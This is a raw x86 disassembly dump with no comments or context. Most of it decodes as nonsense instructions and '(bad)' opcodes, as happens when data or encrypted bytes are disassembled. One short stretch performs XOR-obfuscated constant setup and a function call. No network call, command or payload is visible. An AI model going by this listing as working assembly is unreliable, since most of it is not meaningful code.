  41a2db:	jbe    0x41a343
  41a2dd:	add    esp,DWORD PTR [esi-0x13]
  41a2e0:	inc    edi
  41a2e1:	adc    bh,dl
  41a2e3:	mov    cl,0xd1
  41a2e5:	pop    esp
  41a2e6:	xchg   edx,eax
  41a2e7:	cmp    DWORD PTR [ebx+0x3265f07e],esp
  41a2ed:	jge    0x41a32d
  41a2ef:	dec    edi
  41a2f0:	push   ecx
  41a2f1:	imul   esp,DWORD PTR [edi+0x7f79571f],0xffffff86
  41a2f8:	pop    ss
  41a2f9:	pop    esp
  41a2fa:	mov    dh,0x14
  41a2fc:	mov    dl,0xab
  41a2fe:	enter  0x45b0,0xd8
  41a302:	test   eax,0xf2752122
  41a307:	bound  ecx,QWORD PTR [edx-0x5f]
  41a30a:	das    
  41a30b:	sbb    BYTE PTR ds:0x76673301,cl
  41a311:	iret   
  41a312:	fldcw  WORD PTR [edi-0x6a]
  41a315:	pop    ds
  41a316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a317:	pop    ss
  41a318:	and    BYTE PTR [ecx+0x6d],0x42
  41a31c:	cwde   
  41a31d:	test   DWORD PTR [ebx-0x53a97b50],edx
  41a323:	out    dx,eax
  41a324:	(bad)  
  41a325:	int3   
  41a326:	jmp    0xb27f5e4f
  41a32b:	mov    edi,0xb91fdac1
  41a330:	jle    0x41a2fa
  41a332:	dec    ebx
  41a333:	mov    ?,WORD PTR [ebp+0x70]
  41a336:	sahf   
  41a337:	rcr    BYTE PTR [ecx],cl
  41a339:	leave  
  41a33a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a33b:	aas    
  41a33c:	mov    ecx,0x7a700014
  41a341:	sbb    bl,bl
  41a343:	cdq    
  41a344:	or     BYTE PTR [ebx],0xab
  41a347:	clc    
  41a348:	pop    ebx
  41a349:	mov    edi,0x949e61a2
  41a34e:	fiadd  DWORD PTR [esp+eiz*4-0x3320db6]
  41a355:	adc    dh,al
  41a357:	sbb    al,0xc3
  41a359:	mov    dh,0x38
  41a35b:	pushf  
  41a35c:	loop   0x41a365
  41a35e:	mov    es,WORD PTR [ebx+0x1e]
  41a361:	sti    
  41a362:	add    bl,dh
  41a364:	ins    DWORD PTR es:[edi],dx
  41a365:	jne    0x41a307
  41a367:	xor    BYTE PTR [eax],bl
  41a369:	mov    al,ds:0xf14fa89
  41a36e:	in     al,0xf9
  41a370:	out    dx,eax
  41a371:	add    al,0xc7
  41a373:	addr16 inc edx
  41a375:	xchg   ecx,eax
  41a376:	cmc    
  41a377:	push   eax
  41a378:	or     ch,bl
  41a37a:	lods   eax,DWORD PTR ds:[esi]
  41a37b:	mov    bl,0x4a
  41a37d:	pop    edx
  41a37e:	dec    ebp
  41a37f:	out    dx,al
  41a380:	pop    eax
  41a381:	adc    edx,DWORD PTR [edi+esi*2]
  41a384:	lds    edx,FWORD PTR [ebx+0x7a]
  41a387:	xchg   edx,eax
  41a388:	arpl   WORD PTR [esi-0xf],di
  41a38b:	cmc    
  41a38c:	cmc    
  41a38d:	jnp    0x41a3b3
  41a38f:	stos   DWORD PTR es:[edi],eax
  41a390:	pop    ds
  41a391:	mov    edi,0x3981f17d
  41a396:	and    DWORD PTR [edi+0x62],esi
  41a399:	iret   
  41a39a:	xor    eax,0x3c68f166
  41a39f:	adc    al,0x11
  41a3a1:	xor    ch,BYTE PTR [edi+0x36718d10]
  41a3a7:	pushf  
  41a3a8:	fwait
  41a3a9:	inc    edi
  41a3aa:	xchg   ecx,eax
  41a3ab:	test   DWORD PTR ds:[ebp+0x453f3241],esp
  41a3b2:	sub    ch,BYTE PTR [ecx+0x76]
  41a3b5:	push   ebp
  41a3b6:	ret    0xa6ef
  41a3b9:	imul   ecx,DWORD PTR [ebx+0x70],0x75828292
  41a3c0:	jmp    0x8bee8189
  41a3c5:	sar    DWORD PTR [edx+0x275c6d68],cl
  41a3cb:	pop    ebx
  41a3cc:	sbb    al,0x1
  41a3ce:	outs   dx,DWORD PTR ds:[esi]
  41a3cf:	pop    edi
  41a3d0:	(bad)  
  41a3d1:	aaa    
  41a3d2:	and    eax,ebp
  41a3d4:	mov    dh,0xb6
  41a3d6:	and    ebx,edi
  41a3d8:	or     eax,0xa6a8855d
  41a3dd:	sbb    eax,0x681db75
  41a3e2:	mov    DWORD PTR [edi-0x19],ebp
  41a3e5:	test   al,0x34
  41a3e7:	xor    al,0xa7
  41a3e9:	test   eax,0xe957b806
  41a3ee:	xlat   BYTE PTR ds:[ebx]
  41a3ef:	nop
  41a3f0:	fcom   QWORD PTR [ebx+edx*1+0x24e6be89]
  41a3f7:	push   0x2b
  41a3f9:	fldenv [eax]
  41a3fb:	or     edx,DWORD PTR [edi]
  41a3fd:	ds (bad) 
  41a3ff:	in     al,dx
  41a400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a401:	imul   ebx,DWORD PTR [edx+esi*1+0x77],0xeee5707a
  41a409:	das    
  41a40a:	aad    0x11
  41a40c:	pop    es
  41a40d:	sub    DWORD PTR [ebx+0x263e612c],edx
  41a413:	fldenv [ebx-0x35]
  41a416:	jmp    0x46e5:0xb65ddb32
  41a41d:	aam    0x26
  41a41f:	sub    eax,0x5c374e8d
  41a424:	in     al,0xdd
  41a426:	and    BYTE PTR [eax+0x21],bl
  41a429:	loop   0x41a48b
  41a42b:	inc    esi
  41a42c:	int3   
  41a42d:	pop    ecx
  41a42e:	sbb    eax,0x8cf03b25
  41a433:	lods   eax,DWORD PTR ds:[esi]
  41a434:	xchg   esp,eax
  41a435:	xlat   BYTE PTR ds:[ebx]
  41a436:	test   al,0xa9
  41a438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a439:	imul   ecx,DWORD PTR ds:0x8e6fe430,0x7e
  41a440:	add    BYTE PTR [edi+ecx*8-0xf],bl
  41a444:	add    bx,di
  41a447:	mov    ah,0xa4
  41a449:	cmp    eax,0xe9b9fbda
  41a44e:	call   0xa5f7:0xec129464
  41a455:	leave  
  41a456:	pop    eax
  41a457:	call   0xda4af535
  41a45c:	xor    BYTE PTR [ecx-0x379b3daa],dl
  41a462:	das    
  41a463:	xchg   edx,eax
  41a464:	test   DWORD PTR [ecx+0x20519421],eax
  41a46a:	mov    esp,0xdf8b1e6a
  41a46f:	gs xchg dl,dh
  41a472:	jecxz  0x41a435
  41a474:	cmp    DWORD PTR [ebx+0x47348cc6],ebx
  41a47a:	sbb    al,0x82
  41a47c:	mov    ebx,0x75ac5912
  41a481:	lods   al,BYTE PTR ds:[esi]
  41a482:	cmp    BYTE PTR [edi+0x14d0216],0x51
  41a489:	int3   
  41a48a:	fidivr DWORD PTR [edx+0x4e8731d6]
  41a490:	xor    DWORD PTR [esi],0x40c2909c
  41a496:	mov    ah,0x3e
  41a498:	jae    0x41a451
  41a49a:	imul   edx,DWORD PTR [eax-0x1bb756ec],0x5d
  41a4a1:	pop    esi
  41a4a2:	sahf   
  41a4a3:	jae    0x41a515
  41a4a5:	mov    ds:0xe01b0859,al
  41a4aa:	sub    WORD PTR [edx+eiz*2+0x7e],di
  41a4af:	add    eax,0x4ad3108
  41a4b4:	xor    esp,DWORD PTR [ebx-0x50]
  41a4b7:	and    cl,BYTE PTR [edx]
  41a4b9:	gs mov ebx,0xacc5bc34
  41a4bf:	mov    esi,0xaffaf050
  41a4c4:	sbb    ah,ah
  41a4c6:	jg     0x41a51f
  41a4c8:	and    al,0xd8
  41a4ca:	and    al,0xed
  41a4cc:	push   ebx
  41a4cd:	adc    al,BYTE PTR [ebx-0x3bd2e469]
  41a4d3:	sti    
  41a4d4:	addr16 mov edi,0xcdddd0aa
  41a4da:	ss call 0x9fae:0x8cc6260a
  41a4e2:	aas    
  41a4e3:	pushf  
  41a4e4:	pop    ebp
  41a4e5:	ret    
  41a4e6:	ret    0xc969
  41a4e9:	and    edx,DWORD PTR [ecx]
  41a4eb:	call   0xb9dd:0x9c3eb8d3
  41a4f2:	pop    DWORD PTR [ebp+0x942387]
  41a4f8:	jmp    DWORD PTR [ecx-0x62c5bf92]
  41a4fe:	retf   
  41a4ff:	adc    ecx,DWORD PTR [ebx-0x51]
  41a502:	mov    dh,0xce
  41a504:	cwde   
  41a505:	sbb    bh,BYTE PTR [eax+ecx*1-0x40]
  41a509:	xor    ecx,edx
  41a50b:	daa    
  41a50c:	iret   
  41a50d:	cdq    
  41a50e:	mov    BYTE PTR [ebx+eiz*1-0xf],bh
  41a512:	push   cs
  41a513:	int3   
  41a514:	mov    bl,0x75
  41a516:	cmp    edx,ecx
  41a518:	pushf  
  41a519:	das    
  41a51a:	into   
  41a51b:	sub    eax,0x1440a079
  41a520:	mov    ds:0xc4564d95,al
  41a525:	stc    
  41a526:	push   ebp
  41a527:	add    ch,BYTE PTR [edi]
  41a529:	popf   
  41a52a:	dec    esi
  41a52b:	xchg   ebx,eax
  41a52c:	retf   0x80f4
  41a52f:	mov    eax,0xc6c6a705
  41a534:	xchg   edi,eax
  41a535:	add    ebx,0xffffffc2
  41a538:	add    edi,esp
  41a53a:	stc    
  41a53b:	mov    eax,esp
  41a53d:	dec    edx
  41a53e:	out    0xc8,al
  41a540:	push   esp
  41a541:	dec    eax
  41a542:	lods   al,BYTE PTR ds:[esi]
  41a543:	das    
  41a544:	cli    
  41a545:	or     ebx,DWORD PTR [edi]
  41a547:	mov    fs,WORD PTR [edi-0x55]
  41a54a:	popf   
  41a54b:	dec    edi
  41a54c:	jae    0x41a51c
  41a54e:	stc    
  41a54f:	add    eax,0xfc36e134
  41a554:	and    DWORD PTR [edi],ebp
  41a556:	push   ebx
  41a557:	mov    ds:0x5f58fc17,eax
  41a55c:	cmp    eax,0xf31aa122
  41a561:	mov    al,ds:0x8f0f172e
  41a566:	dec    edx
  41a567:	sbb    ebp,DWORD PTR [eax+0x4e]
  41a56a:	jp     0x41a50c
  41a56c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a56d:	pop    ebp
  41a56e:	xor    esp,0xd5e6a63a
  41a574:	mov    ecx,0xbb46d829
  41a579:	jae    0x41a57d
  41a57b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a57c:	pop    es
  41a57d:	pop    ss
  41a57e:	scas   al,BYTE PTR es:[edi]
  41a57f:	pop    edx
  41a580:	ins    DWORD PTR es:[edi],dx
  41a581:	(bad)  
  41a582:	adc    dl,bh
  41a584:	ss and al,0xc1
  41a587:	or     dh,ch
  41a589:	pop    edi
  41a58a:	cmc    
  41a58b:	ret    0xf7b5
  41a58e:	jecxz  0x41a603
  41a590:	retf   0xec81
  41a593:	cmp    eax,0x26888d1f
  41a598:	cmp    BYTE PTR [ecx+edx*1-0x2fb4914c],dh
  41a59f:	xchg   ebp,eax
  41a5a0:	mov    esp,0xf39d6dce
  41a5a5:	loope  0x41a5cb
  41a5a7:	shl    BYTE PTR [edi+0x6ee0deb3],1
  41a5ad:	inc    edi
  41a5ae:	xchg   edi,eax
  41a5af:	push   0x1632d72e
  41a5b4:	scas   eax,DWORD PTR es:[edi]
  41a5b5:	icebp  
  41a5b6:	jnp    0x41a565
  41a5b8:	fsubr  QWORD PTR [esi-0x53cb79e7]
  41a5be:	and    DWORD PTR [ecx+0x29],0xd3805008
  41a5c5:	pop    esi
  41a5c6:	push   ds
  41a5c7:	adc    al,0xf9
  41a5c9:	mov    ch,0x34
  41a5cb:	sbb    ebx,eax
  41a5cd:	stos   DWORD PTR es:[edi],eax
  41a5ce:	bound  esi,QWORD PTR [ebp+edi*8-0x4d8afe5d]
  41a5d5:	push   cs
  41a5d6:	das    
  41a5d7:	and    BYTE PTR [esi],0xc0
  41a5da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5db:	jl     0x41a56c
  41a5dd:	cmp    ebx,ebx
  41a5df:	jle    0x41a5bf
  41a5e1:	ss dec edi
  41a5e3:	mov    al,0x6d
  41a5e5:	cmp    BYTE PTR [esi-0x3e],dh
  41a5e8:	pop    eax
  41a5e9:	push   eax
  41a5ea:	mov    bl,0x45
  41a5ec:	sti    
  41a5ed:	jns    0x41a5d6
  41a5ef:	adc    edi,DWORD PTR cs:0x95c55261
  41a5f6:	mov    ebx,ebx
  41a5f8:	shr    DWORD PTR [ecx+0x40],1
  41a5fb:	loope  0x41a5a3
  41a5fd:	pushf  
  41a5fe:	lock (bad) 
  41a600:	(bad)  
  41a601:	mov    al,0xf6
  41a603:	mov    ecx,0xf36a7880
  41a608:	inc    ebx
  41a609:	mov    ch,0x30
  41a60b:	mov    bl,0xcc
  41a60d:	pop    esp
  41a60e:	xor    cl,BYTE PTR [ebp+0x63fcc6bf]
  41a614:	repnz mov ebp,0xef7d0bbf
  41a61a:	or     al,0x47
  41a61c:	hlt    
  41a61d:	shrd   DWORD PTR [ecx],edx,0x32
  41a621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a622:	lds    esp,FWORD PTR [edx]
  41a624:	ins    BYTE PTR es:[edi],dx
  41a625:	mov    ds:0x15968de4,al
  41a62a:	popf   
  41a62b:	adc    ebp,DWORD PTR [ecx]
  41a62d:	sbb    DWORD PTR [ecx-0x6d],ebp
  41a630:	jo     0x41a69a
  41a632:	std    
  41a633:	dec    ebx
  41a634:	push   ecx
  41a635:	jle    0x41a61c
  41a637:	dec    ebp
  41a638:	lods   eax,DWORD PTR ds:[esi]
  41a639:	fwait
  41a63a:	cmp    ch,BYTE PTR [edx]
  41a63c:	push   ebp
  41a63d:	push   edx
  41a63e:	sub    bl,BYTE PTR [edx+0x7cdd6298]
  41a644:	jmp    0xbc12:0xe1e9bb54
  41a64b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a64c:	addr16 mov eax,0x4b294bf
  41a652:	call   0x13ab:0x4eca1e87
  41a659:	call   0xc7afbe95
  41a65e:	sub    eax,ecx
  41a660:	mov    ecx,DWORD PTR [esp+0x50]
  41a664:	sbb    edx,ebx
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x422049
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	sahf   
  41a749:	and    al,0xeb
  41a74b:	mov    esi,0x1816a5cf
  41a750:	mov    esp,0x69181812
  41a755:	xor    DWORD PTR [edi-0x8],esp
  41a758:	repnz cdq 
  41a75a:	stos   DWORD PTR es:[edi],eax
  41a75b:	mov    ah,0x24
  41a75d:	inc    ecx
  41a75e:	and    ah,BYTE PTR [ebp+ebp*8-0x27]
  41a762:	pop    edi
  41a763:	jecxz  0x41a77a
  41a765:	inc    ebp
  41a766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a767:	shl    DWORD PTR [ebx],cl
  41a769:	push   esp
  41a76a:	rcl    DWORD PTR [edi],1
  41a76c:	xchg   ebx,eax
  41a76d:	ss pop ecx
  41a76f:	lods   al,BYTE PTR ds:[esi]
  41a770:	scas   eax,DWORD PTR es:[edi]
  41a771:	ds ret 
  41a773:	mov    ch,dl
  41a775:	push   0xe8b78764
  41a77a:	test   al,0xfb
  41a77c:	or     esp,esi
  41a77e:	xchg   esp,eax
  41a77f:	pushf  
  41a780:	pop    ebx
  41a781:	pop    edx
  41a782:	test   BYTE PTR [ebp-0x15],0x9d
  41a786:	clc    
  41a787:	jne    0x41a7f3
  41a789:	lock sub ebp,DWORD PTR gs:[ebp-0x275266c6]
  41a791:	cli    
  41a792:	cmp    esi,DWORD PTR [edx]
  41a794:	jp     0x41a762
  41a796:	or     BYTE PTR [esi-0x2a],ah
  41a799:	push   ss
  41a79a:	sub    BYTE PTR [eax],0xfc
  41a79d:	jb     0x41a80b
  41a79f:	mov    al,0xc7
  41a7a1:	sti    
  41a7a2:	push   esp
  41a7a3:	push   ss
  41a7a4:	push   ebp
  41a7a5:	push   ds
  41a7a6:	mov    esi,0xf87100fb
  41a7ab:	jo     0x41a7bb
  41a7ad:	mov    ecx,0x6328ac48
  41a7b2:	push   esi
  41a7b3:	ss pop esp
  41a7b5:	stos   BYTE PTR es:[edi],al
  41a7b6:	rcr    DWORD PTR [edx-0x703cdf11],0x31
  41a7bd:	jmp    0xe31ed2d8
  41a7c2:	add    BYTE PTR [ecx+esi*2],cl
  41a7c5:	int    0x43
  41a7c7:	mov    bl,0xb4
  41a7c9:	mov    eax,ds:0xe9d675d6
  41a7ce:	xor    bh,ah
  41a7d0:	push   esp
  41a7d1:	cld    
  41a7d2:	in     al,0x6a
  41a7d4:	mov    edi,ebp
  41a7d6:	mov    bl,0xa0
  41a7d8:	or     cl,dh
  41a7da:	push   ss
  41a7db:	fidiv  DWORD PTR [eax]
  41a7dd:	retf   0x7f74
  41a7e0:	dec    esi
  41a7e1:	das    
  41a7e2:	pop    esp
  41a7e3:	xor    al,0x51
  41a7e5:	cld    
  41a7e6:	mov    al,0xee
  41a7e8:	fmul   DWORD PTR [esi-0x3269f9e9]
  41a7ee:	dec    esi
  41a7ef:	outs   dx,BYTE PTR ds:[esi]
  41a7f0:	nop
  41a7f1:	and    eax,0x3bd4c6bf
  41a7f6:	jg     0x41a781
  41a7f8:	popa   
  41a7f9:	xor    ebp,DWORD PTR [eax-0x6e528a06]
  41a7ff:	xor    BYTE PTR [esi+0xd],al
  41a802:	out    dx,al
  41a803:	push   esi
  41a804:	cmp    ebp,DWORD PTR [edx-0x251b7a8b]
  41a80a:	adc    BYTE PTR [eax+0x27538c59],ch
  41a810:	iret   
  41a811:	push   0x6e42370f
  41a816:	jae    0x41a810
  41a818:	imul   esi,DWORD PTR [edi+0x6952ed1],0xffffffce
  41a81f:	add    BYTE PTR [esi],ch
  41a821:	mov    esi,DWORD PTR [ebx-0x3]
  41a824:	or     al,0x53
  41a826:	mov    dh,BYTE PTR [ecx+eax*2]
  41a829:	sub    ebx,DWORD PTR [ebx]
  41a82b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a82c:	rcl    BYTE PTR ds:0x60092579,cl
  41a832:	mov    BYTE PTR [edi-0x455143d0],ch
  41a838:	mov    DWORD PTR [eax-0x4b],ecx
  41a83b:	cs jl  0x41a89d
  41a83e:	retf   0x4f9
  41a841:	mov    esp,ebx
  41a843:	popa   
  41a844:	loop   0x41a879
  41a846:	sub    eax,0xd6230ebf
  41a84b:	jmp    0x41a8be
  41a84d:	sbb    BYTE PTR [ebp+0x798ae264],bl
  41a853:	mov    esi,DWORD PTR [eax+eax*4]
  41a856:	add    dl,dh
  41a858:	int    0x9c
  41a85a:	gs jmp 0x94cf:0xdb362dec
  41a862:	inc    edi
  41a863:	xchg   esp,eax
  41a864:	neg    BYTE PTR [ebp-0x4c1de0]
  41a86a:	test   DWORD PTR [edi],ebx
  41a86c:	mov    edx,0x2d5f4b
  41a871:	mov    ebp,0xdd701d04
  41a876:	loopne 0x41a87a
  41a878:	jb     0x41a87a
  41a87a:	add    edx,ebp
  41a87c:	sbb    esp,DWORD PTR [ecx+0x18]
  41a87f:	test   DWORD PTR [esp+ecx*4],esi
  41a882:	cld    
  41a883:	add    al,0x1a
  41a885:	push   ss
  41a886:	addr16 das 
  41a888:	lahf   
  41a889:	sub    eax,0x5d5f6a91
  41a88e:	int    0x1
  41a890:	std    
  41a891:	fs stos BYTE PTR es:[edi],al
  41a893:	outs   dx,BYTE PTR ds:[esi]
  41a894:	mov    edx,0x5ed598a6
  41a899:	scas   al,BYTE PTR es:[edi]
  41a89a:	mov    bh,0x50
  41a89c:	jle    0x41a8e1
  41a89e:	int3   
  41a89f:	idiv   esp
  41a8a1:	jb     0x41a881
  41a8a3:	jp     0x41a902
  41a8a5:	xor    al,0xe3
  41a8a7:	jno    0x41a835
  41a8a9:	xor    BYTE PTR [ecx],ch
  41a8ab:	xor    BYTE PTR [eax],ch
  41a8ad:	into   
  41a8ae:	pop    esi
  41a8af:	mov    edi,0x1bb62a93
  41a8b4:	ja     0x41a88f
  41a8b6:	aaa    
  41a8b7:	push   edx
  41a8b8:	and    eax,0x9a9fc4d0
  41a8bd:	xchg   DWORD PTR [esp+edx*1+0x1203a623],edi
  41a8c4:	fwait
  41a8c5:	lods   eax,DWORD PTR ds:[esi]
  41a8c6:	xchg   edx,eax
  41a8c7:	xor    ch,cl
  41a8c9:	setl   ah
  41a8cc:	dec    esi
  41a8cd:	shr    eax,0x95
  41a8d0:	fsubr  st(5),st
  41a8d2:	sub    bh,ch
  41a8d4:	pop    es
  41a8d5:	cld    
  41a8d6:	loope  0x41a8dd
  41a8d8:	sub    al,0xd2
  41a8da:	scas   al,BYTE PTR es:[edi]
  41a8db:	push   esi
  41a8dc:	ret    0x9c24
  41a8df:	(bad)  
  41a8e0:	xlat   BYTE PTR ds:[ebx]
  41a8e1:	cmp    ebx,0x72
  41a8e4:	or     ah,al
  41a8e6:	pop    edx
  41a8e7:	mov    ds:0xf0888402,eax
  41a8ec:	sub    al,0xc8
  41a8ee:	adc    BYTE PTR [ebx],dl
  41a8f0:	dec    ebp
  41a8f1:	imul   ecx,DWORD PTR [ebp-0x7bc39577],0x4777efa4
  41a8fb:	addr16 mov edx,0xfecd4723
  41a901:	(bad)  
  41a902:	cli    
  41a903:	fsub   st,st(5)
  41a905:	ret    
  41a906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a907:	xor    ebp,DWORD PTR [esi+0x30a8b7f2]
  41a90d:	cmp    cl,BYTE PTR [edx-0x1496d7b4]
  41a913:	sub    al,BYTE PTR [ecx+0x19d45c63]
  41a919:	mov    ds:0x22f41b7c,al
  41a91e:	sahf   
  41a91f:	pop    esi
  41a920:	mov    ?,edi
  41a922:	xor    al,0xf1
  41a924:	dec    esi
  41a925:	jb     0x41a974
  41a927:	(bad)  
  41a928:	or     DWORD PTR [eax+0x36792855],eax
  41a92e:	les    ecx,FWORD PTR [edi-0x18]
  41a931:	std    
  41a932:	and    al,0xe
  41a934:	das    
  41a935:	sbb    esp,ebx
  41a937:	sub    DWORD PTR [esi+esi*2-0x4a6f429a],0x64
  41a93f:	(bad)  
  41a940:	cmp    ebp,DWORD PTR [edi+0x60]
  41a943:	cmc    
  41a944:	adc    BYTE PTR [eax],dh
  41a946:	into   
  41a947:	fsub   DWORD PTR [eax+0x22]
  41a94a:	cmp    BYTE PTR [edx+0x55e811e6],cl
  41a950:	repz gs scas eax,DWORD PTR es:[edi]
  41a953:	stc    
  41a954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a955:	leave  
  41a956:	push   ecx
  41a957:	and    dl,BYTE PTR [edi+eax*2-0x19a56e5d]
  41a95e:	jns    0x41a944
  41a960:	xor    esp,DWORD PTR [ecx-0x2c]
  41a963:	sub    BYTE PTR [eax-0x1e],ch
  41a966:	retf   0xbf6f
  41a969:	das    
  41a96a:	sub    DWORD PTR [edi+0x43864aed],ebx
  41a970:	push   edx
  41a971:	adc    ebx,DWORD PTR [edi-0x42]
  41a974:	sahf   
  41a975:	leave  
  41a976:	add    dl,BYTE PTR [ecx+0x32e97cf5]
  41a97c:	stos   DWORD PTR es:[edi],eax
  41a97d:	xchg   ecx,eax
  41a97e:	add    DWORD PTR [edi],esi
  41a980:	sub    dl,BYTE PTR [esi-0x68]
  41a983:	sub    esp,DWORD PTR [ebx-0x7f]
  41a986:	push   esp
  41a987:	push   es
  41a988:	and    DWORD PTR ds:0x227d536c,ebp
  41a98e:	ret    0x85d1
  41a991:	xor    eax,0x9987caa5
  41a996:	adc    DWORD PTR [ebx-0x3cfbac6e],ebx
  41a99c:	dec    ebx
  41a99d:	push   ebp
  41a99e:	push   ds
  41a99f:	in     al,0x5f
  41a9a1:	inc    edx
  41a9a2:	push   esi
  41a9a3:	cmp    cl,al
  41a9a5:	outs   dx,BYTE PTR ds:[esi]
  41a9a6:	cmc    
  41a9a7:	push   edi
  41a9a8:	inc    eax
  41a9a9:	xchg   DWORD PTR [eax+0x11ade675],ebx
  41a9af:	xchg   dl,bl
  41a9b1:	fwait
  41a9b2:	mov    eax,ds:0x42959b91
  41a9b7:	push   0x45
  41a9b9:	sub    al,BYTE PTR [ebx]
  41a9bb:	jl     0x41a9a1
  41a9bd:	or     eax,0x5c3f0d74
  41a9c2:	mov    ch,0x99
  41a9c4:	data16 mov bl,0x1d
  41a9c7:	cmp    DWORD PTR [edx-0x58fe3b57],esi
  41a9cd:	or     al,0x54
  41a9cf:	sbb    eax,0xf335ca1a
  41a9d4:	dec    edx
  41a9d5:	shr    DWORD PTR [edi-0x44],cl
  41a9d8:	pop    eax
  41a9d9:	enter  0xf386,0x25
  41a9dd:	bound  edx,QWORD PTR [ebp+edi*2+0x3c]
  41a9e1:	ins    DWORD PTR es:[edi],dx
  41a9e2:	dec    ecx
  41a9e3:	and    eax,0x5691dc24
  41a9e8:	sbb    al,0x89
  41a9ea:	stc    
  41a9eb:	outs   dx,BYTE PTR ds:[esi]
  41a9ec:	imul   ecx,DWORD PTR [ecx],0x4b
  41a9ef:	dec    ebx
  41a9f0:	or     eax,ecx
  41a9f2:	enter  0x3606,0x1b
  41a9f6:	loopne 0x41a9d9
  41a9f8:	xchg   edx,eax
  41a9f9:	dec    esp
  41a9fa:	cmp    eax,DWORD PTR [edx+0xa4ea6cb]
  41aa00:	mov    eax,0xe02fa046
  41aa05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa06:	leave  
  41aa07:	mov    cl,bl
  41aa09:	shl    BYTE PTR [edi-0x3e],0x39
  41aa0d:	loope  0x41a9d2
  41aa0f:	in     eax,0x6a
  41aa11:	retf   0x9918
  41aa14:	and    bh,BYTE PTR [eax]
  41aa16:	jo     0x41a9f8
  41aa18:	cmp    eax,0x272cd00c
  41aa1d:	iret   
  41aa1e:	scas   eax,DWORD PTR es:[edi]
  41aa1f:	mov    ds:0xe10da8f1,al
  41aa24:	ja     0x41a9fb
  41aa26:	cld    
  41aa27:	xchg   ebx,eax
  41aa28:	cmp    BYTE PTR [esi-0x1842d8d6],ah
  41aa2e:	xor    ecx,DWORD PTR [ebp-0x466d7de0]
  41aa34:	rcl    BYTE PTR [eax+ecx*8-0x54b18827],cl
  41aa3b:	pushf  
  41aa3c:	test   BYTE PTR [ebx+0xa5891d],bl
  41aa42:	loopne 0x41aa26
  41aa44:	mov    ecx,0xbbb13f43
  41aa49:	xlat   BYTE PTR ds:[ebx]
  41aa4a:	fild   WORD PTR [edx+0x69]
  41aa4d:	mov    dl,0xec
  41aa4f:	call   0x8548:0xf76a95c3
  41aa56:	mov    edx,0xb6ad8c0b
  41aa5b:	test   edx,0xc0f1d68
  41aa61:	js     0x41aa25
  41aa63:	add    esp,eax
  41aa65:	mov    ecx,0x2a7f25f9
  41aa6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa6b:	sub    ebp,DWORD PTR [esi+0x12751140]
  41aa71:	outs   dx,BYTE PTR cs:[esi]
  41aa73:	pushf  
  41aa74:	mov    ah,0x97
  41aa76:	jge    0x41aadb
  41aa78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa79:	and    BYTE PTR [esi-0x10],dh
  41aa7c:	sub    al,0xec
  41aa7e:	and    ecx,DWORD PTR fs:[esi-0x19e18f36]
  41aa85:	aam    0x8
  41aa87:	sbb    ebp,DWORD PTR [ebx+0x53]
  41aa8a:	js     0x41aa0e
  41aa8c:	cmp    ecx,DWORD PTR [ebx-0x7c9ff94d]
  41aa92:	or     eax,0x2f670b83
  41aa97:	pop    edx
  41aa98:	sbb    DWORD PTR [edi+ecx*2+0x47533358],ebp
  41aa9f:	pop    ebp
  41aaa0:	xor    ebx,DWORD PTR [edx]
  41aaa2:	sub    esi,eax
  41aaa4:	imul   esp,DWORD PTR [ebx-0x77],0x6c
  41aaa8:	cld    
  41aaa9:	repz and DWORD PTR [ecx+0x67df0e0],0xf
  41aab1:	inc    ebx
  41aab2:	test   ecx,esp
